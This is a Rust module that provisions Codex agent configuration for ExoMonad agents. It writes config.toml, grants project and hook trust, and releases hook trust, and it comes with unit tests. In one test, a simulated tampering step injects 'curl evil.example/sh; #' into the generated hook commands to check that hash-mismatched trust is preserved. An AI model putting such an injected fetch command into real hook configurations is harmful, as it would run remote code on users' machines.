//! The one Codex configuration lifecycle shared by every ExoMonad agent.
//!
//! Every ExoMonad agent that runs on the Codex harness — leaves, workers,
//! reviewers, and companions — provisions its Codex configuration through
//! [`provision_codex_agent`]: render `<agent dir>/.codex/config.toml`, write it,
//! grant Codex *project* trust, and install the matching Codex *hook* trust in
//! the Codex user config. No other call site writes a Codex config or seeds
//! `[hooks.state]`; a config written outside this module is a config Codex will
//! not load without a review prompt.
//!
//! The reverse direction is [`release_codex_agent_trust`], the symmetric
//! counterpart of [`crate::codex_config::uninstall_codex_hook_trust`]. It
//! removes the hook trust this module installed and *reports* the project trust
//! it deliberately keeps; see [`RetainedProjectTrust`] for why project trust is
//! never deleted.
//!
//! Removal is never triggered by process exit. Dormant `resume_pr` owners keep
//! their trust; removal belongs to verified permanent resource disposal
//! (chainlink #1124), which is the only caller [`release_codex_agent_trust`]
//! is allowed to have.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde_json::Value;

use super::spawn::{
    CODEX_DEV_INSTRUCTIONS, CODEX_REVIEWER_INSTRUCTIONS, CODEX_TL_RUNTIME_NOTES,
    CODEX_WORKER_INSTRUCTIONS,
};
use crate::codex_config::{self, HookTrustRemoval};

/// Roles whose Codex instructions are the TL protocol rather than a dev, worker,
/// or reviewer protocol.
///
/// These cover Codex *sub-TLs* spawned by a running TL. The Python TL
/// controller is the project's root controller and is not one of these agents:
/// it consumes `.exo/tl-loop/plan.json` and needs no Codex root configuration,
/// so normal Python-controller startup provisions no Codex agent in the project
/// root at all.
const TL_ROLES: [&str; 2] = ["tl", "root"];

/// Everything one Codex agent needs to be provisioned.
pub struct CodexAgentSpec<'a> {
    /// Directory the agent runs in (`codex exec --cd <agent_dir>`). Its
    /// `.codex/config.toml` is the project config Codex reads, and its path is
    /// the project ExoMonad grants trust for.
    pub agent_dir: &'a Path,
    /// Agent identity used for the ExoMonad MCP server args.
    pub agent_name: &'a str,
    /// Role whose protocol and sandbox scope select the rendered instructions.
    pub role: &'a str,
    /// Resolved role context, when one exists for the project. Rendered inline
    /// as Codex `developer_instructions`.
    pub role_context: Option<&'a str>,
    /// Model to pin in `config.toml`, when configured.
    pub model: Option<&'a str>,
    /// Reasoning effort to pin in `config.toml`, when configured.
    pub effort: Option<&'a str>,
    /// Extra MCP servers from `.exo/config.toml` to copy into the config.
    pub extra_mcp_servers: &'a HashMap<String, Value>,
    /// Absolute `exomonad` binary path rendered into the hook commands.
    pub exomonad_binary: &'a Path,
}

/// Where a provisioned Codex agent's configuration and trust live.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProvisionedCodexAgent {
    /// The directory the agent runs in.
    pub agent_dir: PathBuf,
    /// The generated `<agent_dir>/.codex/config.toml`.
    pub config_path: PathBuf,
    /// The Codex user config trust was written to, or `None` when no Codex home
    /// could be resolved.
    pub user_config_path: Option<PathBuf>,
}

impl ProvisionedCodexAgent {
    /// Re-derives the provisioned paths for an agent directory, so a disposal
    /// path that only retained the directory can still release its trust
    /// without having kept the whole [`provision_codex_agent`] result.
    pub fn for_agent_dir(agent_dir: impl Into<PathBuf>) -> Self {
        let agent_dir = agent_dir.into();
        Self {
            config_path: agent_dir.join(".codex").join("config.toml"),
            user_config_path: codex_config::codex_user_config_path(),
            agent_dir,
        }
    }

    /// The `[projects."…"]` trust key ExoMonad grants for this agent.
    pub fn project_trust_key(&self) -> String {
        self.agent_dir.display().to_string()
    }
}

/// Project trust ExoMonad kept instead of deleting, and why.
///
/// ExoMonad writes `[projects."<agent dir>"] trust_level = "trusted"` into the
/// Codex user config, but that entry carries no provenance: it is a bare
/// path-to-trust-level pair, indistinguishable from a project the operator
/// trusted by hand. Deleting it would destroy user state on a guess.
///
/// Hook trust has the provenance project trust lacks — every `[hooks.state]`
/// key carries a `trusted_hash` ExoMonad can recompute from the generated
/// config — so hook trust is removed and project trust is retained until
/// ExoMonad records ownership of the project entry at install time.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RetainedProjectTrust {
    /// The Codex user config the entry lives in.
    pub user_config_path: Option<PathBuf>,
    /// The `[projects."…"]` key ExoMonad kept.
    pub project_key: String,
}

impl std::fmt::Display for RetainedProjectTrust {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            formatter,
            "kept project trust [projects.\"{}\"]{}: ExoMonad records no provenance for a \
             Codex project trust entry, so it will not delete one it cannot prove it created",
            self.project_key,
            match &self.user_config_path {
                Some(path) => format!(" in {}", path.display()),
                None => String::new(),
            }
        )
    }
}

/// What [`release_codex_agent_trust`] removed and what it kept.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CodexTrustRelease {
    /// Hook trust ExoMonad removed, and hook trust it deliberately preserved.
    pub hook_trust: HookTrustRemoval,
    /// Project trust ExoMonad kept.
    pub project_trust: RetainedProjectTrust,
}

impl std::fmt::Display for CodexTrustRelease {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(formatter, "{}; {}", self.hook_trust, self.project_trust)
    }
}

/// Renders the Codex `developer_instructions` for one role.
///
/// One mapping, shared by every agent shape, so a leaf, a worker, a reviewer,
/// and a companion with the same role receive byte-identical instructions.
pub fn codex_role_instructions(role: &str, role_context: Option<&str>) -> String {
    let is_tl = TL_ROLES.contains(&role);
    let protocol = match role {
        "worker" => CODEX_WORKER_INSTRUCTIONS,
        "reviewer" => CODEX_REVIEWER_INSTRUCTIONS,
        role if TL_ROLES.contains(&role) => CODEX_TL_RUNTIME_NOTES,
        _ => CODEX_DEV_INSTRUCTIONS,
    };
    let Some(context) = role_context.map(str::trim).filter(|it| !it.is_empty()) else {
        return protocol.to_string();
    };
    // A TL agent reads the shared protocol first and the Codex-specific runtime
    // notes after it; every other role reads its own protocol first and the
    // project role context after it.
    if is_tl {
        format!("{context}\n\n{protocol}")
    } else {
        format!("{protocol}\n\n{context}")
    }
}

/// Provisions one Codex agent: config, project trust, and hook trust.
///
/// This is the single write path for `.codex/config.toml`. It is deliberately
/// symmetric: the config is written before trust is seeded, and the hook trust
/// is computed from the config bytes just written, so one call always leaves
/// the Codex user config holding both the project trust entry and the three
/// `[hooks.state]` entries the config's hooks need.
pub fn provision_codex_agent(spec: &CodexAgentSpec<'_>) -> std::io::Result<ProvisionedCodexAgent> {
    let codex_dir = spec.agent_dir.join(".codex");
    std::fs::create_dir_all(&codex_dir)?;

    let config = codex_config::render_codex_config_with_effort(
        spec.agent_name,
        spec.role,
        &codex_role_instructions(spec.role, spec.role_context),
        spec.model,
        spec.effort,
        spec.extra_mcp_servers,
        spec.exomonad_binary,
        spec.agent_dir,
    );
    let config_path = codex_dir.join("config.toml");
    std::fs::write(&config_path, config)?;

    // `.codex/hooks.json` is the pre-config.toml hook layout. Leaving it beside
    // the generated config would run every ExoMonad hook twice.
    let legacy_hooks_path = codex_dir.join("hooks.json");
    if legacy_hooks_path.exists() {
        std::fs::remove_file(&legacy_hooks_path)?;
    }

    let user_config_path = match codex_config::codex_user_config_path() {
        Some(user_config_path) => {
            codex_config::trust_codex_project(&user_config_path, spec.agent_dir)?;
            codex_config::install_codex_hook_trust(&user_config_path, &config_path)?;
            Some(user_config_path)
        }
        None => {
            tracing::warn!(
                agent_dir = %spec.agent_dir.display(),
                "Could not determine Codex home; the Codex project and hooks may not be trusted automatically"
            );
            None
        }
    };

    Ok(ProvisionedCodexAgent {
        agent_dir: spec.agent_dir.to_path_buf(),
        config_path,
        user_config_path,
    })
}

/// Removes the trust [`provision_codex_agent`] installed for one Codex agent.
///
/// The exact inverse of provisioning: the hook trust is removed through
/// [`codex_config::uninstall_codex_hook_trust`], which only deletes records
/// whose `trusted_hash` still matches the generated config, and the project
/// trust is retained and reported because ExoMonad records no provenance for a
/// Codex project trust entry (see [`RetainedProjectTrust`]).
///
/// Only verified permanent resource disposal may call this. A dormant owner
/// awaiting `resume_pr` is not disposed and must keep its trust.
pub fn release_codex_agent_trust(
    provisioned: &ProvisionedCodexAgent,
) -> std::io::Result<CodexTrustRelease> {
    let project_trust = RetainedProjectTrust {
        user_config_path: provisioned.user_config_path.clone(),
        project_key: provisioned.project_trust_key(),
    };
    let Some(user_config_path) = provisioned.user_config_path.as_deref() else {
        return Ok(CodexTrustRelease {
            hook_trust: HookTrustRemoval::default(),
            project_trust,
        });
    };
    let hook_trust =
        codex_config::uninstall_codex_hook_trust(user_config_path, &provisioned.config_path)?;
    Ok(CodexTrustRelease {
        hook_trust,
        project_trust,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::codex_config::HookTrustPreserveReason;
    use serial_test::serial;

    fn test_spec<'a>(
        agent_dir: &'a Path,
        role: &'a str,
        extra_mcp_servers: &'a HashMap<String, Value>,
    ) -> CodexAgentSpec<'a> {
        CodexAgentSpec {
            agent_dir,
            agent_name: "issue-42-leaf-codex",
            role,
            role_context: Some("SENTINEL ROLE CONTEXT"),
            model: None,
            effort: None,
            extra_mcp_servers,
            exomonad_binary: Path::new("/usr/local/bin/exomonad"),
        }
    }

    /// Points `codex_user_config_path()` at an isolated Codex home for the
    /// duration of one test, so no test reads or writes the operator's
    /// `~/.codex/config.toml`.
    fn isolated_codex_home(root: &Path) -> PathBuf {
        let codex_home = root.join("codex-home");
        std::fs::create_dir_all(&codex_home).unwrap();
        std::env::set_var("CODEX_HOME", &codex_home);
        codex_home
    }

    fn user_config(codex_home: &Path) -> toml::Value {
        let raw = std::fs::read_to_string(codex_home.join("config.toml"))
            .expect("Codex user config was written");
        toml::from_str(&raw).expect("Codex user config is valid TOML")
    }

    fn assert_provisioned(codex_home: &Path, provisioned: &ProvisionedCodexAgent) {
        assert_eq!(
            provisioned.user_config_path.as_deref(),
            Some(codex_home.join("config.toml").as_path()),
            "provision must record where it seeded trust so disposal can release it"
        );
        let user = user_config(codex_home);
        let project = provisioned.agent_dir.display().to_string();
        assert_eq!(
            user["projects"][&project]["trust_level"].as_str(),
            Some("trusted"),
            "one config write must leave matching Codex project trust"
        );
        let key_source = provisioned.config_path.display().to_string();
        for event in ["pre_tool_use", "post_tool_use", "stop"] {
            let hash = user["hooks"]["state"][&format!("{key_source}:{event}:0:0")]["trusted_hash"]
                .as_str()
                .unwrap_or_else(|| panic!("hook trust for {event} was seeded"));
            assert!(hash.starts_with("sha256:"));
        }
    }

    #[test]
    #[serial]
    fn provisioning_one_config_seeds_matching_project_and_hook_trust() {
        let root = tempfile::tempdir().unwrap();
        let codex_home = isolated_codex_home(root.path());
        let agent_dir = root.path().join("issue-42-leaf-codex");
        let extra = HashMap::new();
        let mut spec = test_spec(&agent_dir, "dev", &extra);
        spec.model = Some("gpt-5.2-codex");

        let provisioned = provision_codex_agent(&spec).unwrap();

        assert!(provisioned.config_path.exists());
        assert!(!provisioned
            .config_path
            .with_file_name("hooks.json")
            .exists());
        assert_provisioned(&codex_home, &provisioned);
        std::env::remove_var("CODEX_HOME");
    }

    #[test]
    #[serial]
    fn every_supported_role_provisions_the_same_trust_contract() {
        let root = tempfile::tempdir().unwrap();
        let codex_home = isolated_codex_home(root.path());
        let extra = HashMap::new();
        let mut reference: Option<String> = None;

        for role in ["dev", "worker", "reviewer", "tl"] {
            let agent_dir = root.path().join(format!("issue-42-{role}-codex"));
            let spec = test_spec(&agent_dir, role, &extra);
            let provisioned = provision_codex_agent(&spec).unwrap();
            assert_provisioned(&codex_home, &provisioned);

            let user = user_config(&codex_home);
            let key_source = provisioned.config_path.display().to_string();
            let shape = ["pre_tool_use", "post_tool_use", "stop"]
                .map(|event| {
                    format!(
                        "{event}={}",
                        user["hooks"]["state"][&format!("{key_source}:{event}:0:0")]
                            ["trusted_hash"]
                            .as_str()
                            .unwrap()
                    )
                })
                .join("\n");
            match &reference {
                None => reference = Some(shape),
                Some(first) => assert_eq!(
                    first, &shape,
                    "role {role} must provision the same hook-trust contract as every other role"
                ),
            }
        }
        std::env::remove_var("CODEX_HOME");
    }

    #[test]
    #[serial]
    fn provisioning_is_idempotent() {
        let root = tempfile::tempdir().unwrap();
        let codex_home = isolated_codex_home(root.path());
        let agent_dir = root.path().join("issue-42-leaf-codex");
        let extra = HashMap::new();
        let spec = test_spec(&agent_dir, "dev", &extra);

        provision_codex_agent(&spec).unwrap();
        let after_first = std::fs::read_to_string(codex_home.join("config.toml")).unwrap();
        provision_codex_agent(&spec).unwrap();
        let after_second = std::fs::read_to_string(codex_home.join("config.toml")).unwrap();

        assert_eq!(
            after_first, after_second,
            "re-provisioning must not duplicate trust"
        );
        std::env::remove_var("CODEX_HOME");
    }

    #[test]
    #[serial]
    fn provisioning_removes_the_legacy_hooks_json() {
        let root = tempfile::tempdir().unwrap();
        let codex_home = isolated_codex_home(root.path());
        let agent_dir = root.path().join("issue-42-leaf-codex");
        let legacy = agent_dir.join(".codex/hooks.json");
        std::fs::create_dir_all(legacy.parent().unwrap()).unwrap();
        std::fs::write(&legacy, "{}\n").unwrap();

        let extra = HashMap::new();
        let spec = test_spec(&agent_dir, "dev", &extra);
        let provisioned = provision_codex_agent(&spec).unwrap();

        assert!(!legacy.exists());
        assert_provisioned(&codex_home, &provisioned);
        std::env::remove_var("CODEX_HOME");
    }

    #[test]
    #[serial]
    fn release_removes_hook_trust_and_retains_project_trust() {
        let root = tempfile::tempdir().unwrap();
        let codex_home = isolated_codex_home(root.path());
        let agent_dir = root.path().join("issue-42-leaf-codex");
        let extra = HashMap::new();
        let spec = test_spec(&agent_dir, "dev", &extra);
        let provisioned = provision_codex_agent(&spec).unwrap();

        let release = release_codex_agent_trust(&provisioned).unwrap();

        assert_eq!(release.hook_trust.checked, 3);
        assert_eq!(release.hook_trust.removed.len(), 3);
        assert!(release.hook_trust.preserved.is_empty());
        assert_eq!(
            release.project_trust.project_key,
            agent_dir.display().to_string()
        );

        let user = user_config(&codex_home);
        assert!(
            user.get("hooks")
                .and_then(|hooks| hooks.get("state"))
                .is_none(),
            "release must leave no hook trust behind, got {}",
            user
        );
        assert_eq!(
            user["projects"][&release.project_trust.project_key]["trust_level"].as_str(),
            Some("trusted"),
            "project trust must survive release: ExoMonad cannot prove it created the entry"
        );
        std::env::remove_var("CODEX_HOME");
    }

    #[test]
    #[serial]
    fn release_is_idempotent_and_reconstructible_from_the_agent_dir() {
        let root = tempfile::tempdir().unwrap();
        isolated_codex_home(root.path());
        let agent_dir = root.path().join("issue-42-leaf-codex");
        let extra = HashMap::new();
        let spec = test_spec(&agent_dir, "dev", &extra);
        provision_codex_agent(&spec).unwrap();

        // A disposal path that only kept the directory must still be able to
        // release the trust without the original provisioning result.
        let first =
            release_codex_agent_trust(&ProvisionedCodexAgent::for_agent_dir(&agent_dir)).unwrap();
        let second =
            release_codex_agent_trust(&ProvisionedCodexAgent::for_agent_dir(&agent_dir)).unwrap();

        assert_eq!(first.hook_trust.removed.len(), 3);
        assert_eq!(second.hook_trust.checked, 3);
        assert!(second.hook_trust.removed.is_empty());
        assert_eq!(first.project_trust, second.project_trust);
        std::env::remove_var("CODEX_HOME");
    }

    #[test]
    #[serial]
    fn release_preserves_user_modified_hook_trust() {
        let root = tempfile::tempdir().unwrap();
        let codex_home = isolated_codex_home(root.path());
        let agent_dir = root.path().join("issue-42-leaf-codex");
        let extra = HashMap::new();
        let spec = test_spec(&agent_dir, "dev", &extra);
        let provisioned = provision_codex_agent(&spec).unwrap();

        // A human edited the generated hooks after ExoMonad trusted them, so
        // every recorded hash now describes a config ExoMonad no longer writes.
        let tampered = std::fs::read_to_string(&provisioned.config_path)
            .unwrap()
            .replace(" hook ", " curl evil.example/sh; #");
        assert_ne!(
            tampered,
            std::fs::read_to_string(&provisioned.config_path).unwrap(),
            "the test must actually change the generated hooks"
        );
        std::fs::write(&provisioned.config_path, tampered).unwrap();

        let release = release_codex_agent_trust(&provisioned).unwrap();

        assert!(
            release.hook_trust.removed.is_empty(),
            "drifted hook records are user state and must be kept"
        );
        assert_eq!(release.hook_trust.preserved.len(), 3);
        assert!(
            release
                .hook_trust
                .preserved
                .iter()
                .all(|entry| matches!(entry.reason, HookTrustPreserveReason::HashMismatch { .. })),
            "drift must be reported as a hash mismatch, not as malformed state"
        );
        assert!(release.to_string().contains("kept project trust"));

        // The preserved records survive the release that declined to touch them.
        let user = user_config(&codex_home);
        let key_source = provisioned.config_path.display().to_string();
        for event in ["pre_tool_use", "post_tool_use", "stop"] {
            assert!(user["hooks"]["state"][&format!("{key_source}:{event}:0:0")]
                .get("trusted_hash")
                .is_some());
        }
        std::env::remove_var("CODEX_HOME");
    }

    #[test]
    fn role_instructions_select_one_protocol_per_role() {
        let cases = [
            ("dev", CODEX_DEV_INSTRUCTIONS),
            ("worker", CODEX_WORKER_INSTRUCTIONS),
            ("reviewer", CODEX_REVIEWER_INSTRUCTIONS),
            ("tl", CODEX_TL_RUNTIME_NOTES),
            ("root", CODEX_TL_RUNTIME_NOTES),
            ("unknown-role", CODEX_DEV_INSTRUCTIONS),
        ];
        for (role, protocol) in cases {
            let instructions = codex_role_instructions(role, Some("SENTINEL ROLE CONTEXT"));
            assert!(
                instructions.contains(protocol.trim()),
                "role {role} protocol"
            );
            assert!(
                instructions.contains("SENTINEL ROLE CONTEXT"),
                "role {role} context"
            );
        }
    }

    #[test]
    fn tl_role_reads_the_shared_protocol_before_the_runtime_notes() {
        let instructions = codex_role_instructions("tl", Some("SHARED TL PROTOCOL"));
        assert!(instructions.starts_with("SHARED TL PROTOCOL\n\n"));
        assert!(instructions.ends_with(CODEX_TL_RUNTIME_NOTES));
    }

    #[test]
    fn non_tl_roles_read_their_protocol_before_the_project_role_context() {
        for role in ["dev", "worker", "reviewer"] {
            let instructions = codex_role_instructions(role, Some("SENTINEL ROLE CONTEXT"));
            assert!(!instructions.starts_with("SENTINEL ROLE CONTEXT"), "{role}");
            assert!(instructions.ends_with("SENTINEL ROLE CONTEXT"), "{role}");
        }
    }

    #[test]
    fn role_instructions_survive_a_missing_role_context() {
        for context in [None, Some(""), Some("   \n  ")] {
            for role in ["dev", "worker", "reviewer", "tl"] {
                let instructions = codex_role_instructions(role, context);
                assert!(
                    !instructions.trim().is_empty(),
                    "role {role} with context {context:?} still needs instructions"
                );
                assert!(!instructions.contains("\n\n\n"));
            }
        }
    }
}
